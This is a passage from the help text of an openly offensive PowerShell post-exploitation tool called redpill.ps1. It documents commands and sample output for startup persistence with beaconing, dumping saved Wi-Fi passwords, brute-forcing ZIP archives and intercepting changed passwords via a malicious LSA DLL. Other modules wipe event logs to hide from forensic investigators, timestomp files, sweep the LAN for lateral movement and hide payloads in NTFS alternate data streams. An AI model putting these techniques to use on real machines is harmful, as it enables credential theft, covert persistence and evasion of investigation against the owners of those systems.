      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1
      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

   .OUTPUTS
      Sherlock.ps1 Persistence Settings
      ---------------------------------
      BeaconHomeInterval : 10 (sec) interval
      ClientAbsoluctPath : C:\Users\pedro\AppData\Local\Temp\Sherlock.ps1
      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
      PersistenceScript  : Successfuly Created!
      wscriptProcStatus  : Stopped! {require SKYNET restart}
      OR the manual execution of Persiste.vbs script! {StartUp}
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "WifiPasswords" -or $Help -ieq "Storage"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump All SSID Wifi passwords

   .DESCRIPTION
      Module to dump SSID Wifi passwords into terminal windows
      OR dump credentials into a zip archive under `$Env:TMP

   .NOTES
      Required Dependencies: netsh {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords Dump
      Dump ALL Wifi Passwords on this terminal prompt

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump
      Dump Wifi Paswords into a Zip archive on %TMP% {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

   .OUTPUTS
      SSID name               Password    
      ---------               --------               
      CampingMilfontesWifi    Milfontes19 
      NOS_Internet_Movel_202E 37067757                                             
      Ondarest                381885C874           
      MEO-968328              310E0CBA14
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "SpeakPrank" -or $Help -ieq "Rate" -or $Help -ieq "Volume"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Speak Prank {SpeechSynthesizer}

   .DESCRIPTION
      Make remote host speak user input sentence (prank)

   .NOTES
      Required Dependencies: SpeechSynthesizer {native}
      Remark: Double Quotes are Mandatory in @arg declarations
      Remark: -Volume controls the speach volume {default: 88}
      Remark: -Rate Parameter configs the SpeechSynthesizer speed

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World"
      Make remote host speak "Hello World" {-Rate 1 -Volume 88}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100

   .OUTPUTS
      RemoteHost SpeachSpeed Volume Speak        
      ---------- ----------- ------ -----        
      SKYNET     5           100    'hello world'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "MsgBox" -or $Help -ieq "TimeOut" -or $Help -ieq "ButtonType"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Spawn a msgBox on local host {ComObject}

   .NOTES
      Required Dependencies: Wscript ComObject {native}
      Remark: Double Quotes are Mandatory in -MsgBox value
      Remark: -TimeOut 0 parameter maintains the msgbox open.

      MsgBox Button Types
      -------------------
      0 - Show OK button. 
      1 - Show OK and Cancel buttons. 
      2 - Show Abort, Retry, and Ignore buttons. 
      3 - Show Yes, No, and Cancel buttons. 
      4 - Show Yes and No buttons. 
      5 - Show Retry and Cancel buttons. 

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World."

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -TimeOut 4
      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -ButtonType 4
      Spawns message box with Yes and No buttons {-ButtonType 4}

   .OUTPUTS
      TimeOut  ButtonType           Message
      -------  ----------           -------
      5 (sec)  'Yes and No buttons' 'Hello World.'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "BruteZip" -or $Help -ieq "PassList"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @securethelogs|@r00t-3xp10it
      Helper - Brute force ZIP archives {7z.exe}

   .DESCRIPTION
      This module brute forces ZIP archives with the help of 7z.exe
      It also downloads custom password list from @josh-newton GitHub
      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt

   .NOTES
      Required Dependencies: 7z.exe {manual-install}
      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
      Remark: Use double quotes if path contains any empty spaces.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -BruteZip `$Env:USERPROFILE\Desktop\redpill.zip
      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.

   .OUTPUTS
      16:32:55 - Brute force Zip archives
      -----------------------------------
      Zip Archive  : redpill.zip
      Archive Size : 7429,9765625/KB
      Password     : King!123
      -----------------------------------
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "CleanTracks"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Clean artifacts {temp,logs,scripts}

   .DESCRIPTION
      Module to clean artifacts that migth lead
      forensic investigatores to attacker tracks.

   .NOTES
      Required Dependencies: cmd|regedit {native}
      Paranoid @arg deletes @redpill auxiliary
      scripts and Deletes All eventvwr logs {admin privs}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Clear
      Basic cleanning {flushdns,Prefetch,Recent,tmp *log|*bat|*vbs}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Paranoid
      Deletes @redpill auxiliary scripts and All eventvwr logs {admin}

   .OUTPUTS
      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
      --------    ----     -------------- --------------- --------------
      CleanTracks 22:17:29 20             3               2
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetPasswords" -or $Help -ieq "StartDir"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Stealing passwords every time they change {mitre T1174}
      Helper - Search for creds in diferent locations {store|regedit|disk}

   .DESCRIPTION
      -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
      -GetPasswords [ Dump ] Explores a native OS notification of when the user
      account password gets changed which is responsible for validating it.
      That means that the user password can be intercepted and logged.

   .NOTES
      -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
      To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum
      Search for creds in store\regedit\disk {txt\xml\logs} diferent locations

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
      Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir directory

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon} by: @mubix

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "FileMace" -or $Help -ieq "Date"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Change file mace time {timestamp}

   .DESCRIPTION
      This module changes the follow mace propertys:
      CreationTime, LastAccessTime, LastWriteTime

   .NOTES
      -Date parameter format: "08 March 1999 19:19:19"
      Remark: Double quotes are mandatory in -Date [ @argument ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace `$Env:TMP\test.txt
      Changes sellected file mace using redpill default -Date [ "data-format" ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace `$Env:TMP\test.txt -Date "08 March 1999 19:19:19"
      Changes sellected file mace using user inputed -Date [ "data-format" ]

   .OUTPUTS
      FullName                        Exists CreationTime       
      --------                        ------ ------------       
      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "NetTrace" -or $Help -ieq "Storage"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Agressive sytem enumeration with netsh

   .NOTES
      Required Dependencies: netsh {native}
      Remark: Administrator privilges required on shell
      Remark: Dump will be saved under %TMP%\NetTrace.cab {default}
      
   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum

   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum -Storage %TMP%

   .OUTPUTS
      Trace configuration:
      -------------------------------------------------------------------
      Status:             Running
      Trace File:         C:\Users\pedro\AppData\Local\Temp\NetTrace.etl
      Append:             Off
      Circular:           On
      Max Size:           4096 MB
      Report:             Off
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PingSweep" -or $Help -ieq "Range"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate active IP Address {Local Lan}

   .DESCRIPTION
      Module to enumerate active IP address of Local Lan
      for possible Lateral Movement oportunitys. It reports
      active Ip address in local lan and scans for open ports
      in all active ip address found by -PingSweep Enum @arg.
      Remark: This module uses ICMP packets (ping) to scan..

   .NOTES
      Required Dependencies: .Net.Networkinformation.ping {native}
      Remark: Ping Sweep module migth take a long time to finish
      depending of -Range parameter user input sellection or if
      the Verbose @Argument its used to scan for open ports and
      resolve ip addr Dns-NameHost to better identify the device.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum
      Enumerate All active IP Address on Local Lan {range 1..255}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum -Range "65,72"
      Enumerate All active IP Address on Local Lan within the Range selected

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Verbose -Range "1,255"
      Enumerate IP addr + open ports + resolve Dns-NameHost in all IP's found

   .OUTPUTS
      Range[65..72] Active IP Address on Local Lan
      --------------------------------------------
      Address       : 192.168.1.65
      Address       : 192.168.1.66
      Address       : 192.168.1.70
      Address       : 192.168.1.72
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "ADS" -or $Help -ieq "HiddeDataOf" -or $Help -ieq "StartDir" -or $Help -ieq "InLegitFile"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Hidde scripts {txt|bat|ps1|exe} on `$DATA records (ADS)
   
   .DESCRIPTION
      Alternate Data Streams (ADS) have been around since the introduction
      of windows NTFS. Basically ADS can be used to hide the presence of a
      secret or malicious file inside the file record of an innocent file.

   .NOTES
      Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt
      This module hiddes {txt|bat|ps1|exe} `$DATA inside ADS records.
      Remark: Payload.[extension] + legit.txt must be on the same dir.
      Remark: Supported Payload Extensions are: txt | bat | ps1 | exe

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "`$Env:TMP"
      Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
      Hidde the data of Payload.bat script inside legit.txt ADS `$DATA record

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
      Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
      Delete payload.bat ADS `$DATA stream from legit.txt text file records

   .OUTPUTS
      AlternateDataStream
      -------------------
      C:\Users\pedro\AppData\Local\Temp\legit.txt

      [cmd prompt] AccessHiddenData
      -----------------------------
      wmic.exe process call create "C:\Users\pedro\AppData\Local\Temp\legit.txt:payload.exe"
   #>!bye..

"@;
Write-Host "$HelpParameters"
}
